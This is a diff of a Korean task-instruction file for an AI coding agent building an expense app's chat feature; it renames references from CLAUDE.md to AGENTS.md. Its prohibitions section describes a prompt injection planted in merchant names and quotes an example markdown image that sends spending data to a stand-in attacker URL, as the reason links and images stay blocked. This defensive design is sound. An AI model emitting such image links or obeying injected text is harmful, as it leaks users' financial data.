@@ -4,7 +4,7 @@
 
 먼저 아래 파일들을 읽고 프로젝트의 아키텍처와 설계 의도를 파악하라:
 
-- `/CLAUDE.md` (CRITICAL: 마크다운은 요소 허용 목록으로 렌더링, `img`·`a` 금지)
+- `/AGENTS.md` (CRITICAL: 마크다운은 요소 허용 목록으로 렌더링, `img`·`a` 금지)
 - `/docs/ARCHITECTURE.md` (API 표의 `POST /api/chat`, 에러 코드 → `apiFetch` 처리)
 - `/docs/USER_FLOWS.md` (AI 예외: 채팅, "가맹점명 injection → 마크다운 요소 제한으로 무력화"), `/docs/UI_GUIDE.md` (입력 필드, 버튼, AI 고지 한 줄)
 - `/src/lib/domain/chat.ts` (`CHAT_EXAMPLES`, `CHAT_LIMITS`, `ChatTurn`, `normalizeHistory`) (Step 1, 3)
@@ -64,7 +64,7 @@ npm run test
 
 ## 금지사항
 
-- `a`·`img`를 허용하거나 `rehype-raw`·`urlTransform` 우회로 링크를 살리지 마라. 이유: 가맹점명 prompt injection이 `![](https://공격자/?q=지출내역)` 같은 이미지·링크로 데이터를 빼낼 수 있다(CLAUDE.md CRITICAL).
+- `a`·`img`를 허용하거나 `rehype-raw`·`urlTransform` 우회로 링크를 살리지 마라. 이유: 가맹점명 prompt injection이 `![](https://공격자/?q=지출내역)` 같은 이미지·링크로 데이터를 빼낼 수 있다(AGENTS.md CRITICAL).
 - 새 npm 패키지(`remark-gfm`, `rehype-sanitize` 등)를 설치하지 마라. 이유: 새 의존성 금지 규칙. 허용 목록 + `skipHtml`로 충분하다.
 - 대화를 `localStorage`·쿠키·DB에 저장하지 마라. 이유: 채팅 기록은 탭 세션에만 둔다(ADR-007). 다른 사람이 같은 기기를 써도 남지 않게 한다.
 - 스트리밍 UI(타자 효과 등)를 흉내 내지 마라. 이유: 응답은 비스트리밍이고, 불필요한 애니메이션은 UI 가이드 위반이다.
